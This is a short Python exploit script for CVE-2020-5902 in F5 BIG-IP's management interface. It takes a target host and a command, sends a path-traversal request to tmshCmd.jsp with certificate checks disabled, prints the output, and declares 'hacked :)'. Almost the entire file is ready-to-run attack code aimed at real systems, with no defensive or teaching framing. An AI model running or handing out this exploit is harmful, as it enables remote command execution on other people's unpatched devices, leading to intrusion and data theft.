import argparse
import requests
import sys
from log_colors import *

# In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 
# 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, 
# the Traffic Management User Interface (TMUI), 
# also referred to as the Configuration utility, 
# has a Remote Code Execution (RCE) vulnerability in undisclosed pages. 
class CVE2020_5902:
    
    def __init__(self, host, cmd):
        print (LogColors.BLUE + "victim: " + host + "..." + LogColors.ENDC)
        self.url, self.cmd = "https://{}".format(host), cmd
        self.session = requests.Session()

    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        url = self.url + '/tmui/login.jsp/..;/tmui/locallb/workspace/'
        url += 'tmshCmd.jsp?command={}'.format(self.cmd)
        print (LogColors.YELLOW + url + LogColors.ENDC)
        r = self.session.get(url, verify = False)
        if r.ok :
            print (LogColors.YELLOW + r.text + LogColors.ENDC)
            print (LogColors.GREEN + "successfully send command. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed. target is not vulnerable :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target ip/host")
    parser.add_argument('-c','--cmd', required = True, help = "commmand")
    args = vars(parser.parse_args())
    cve = CVE2020_5902(args['target'], args['cmd'])
    cve.exploit()

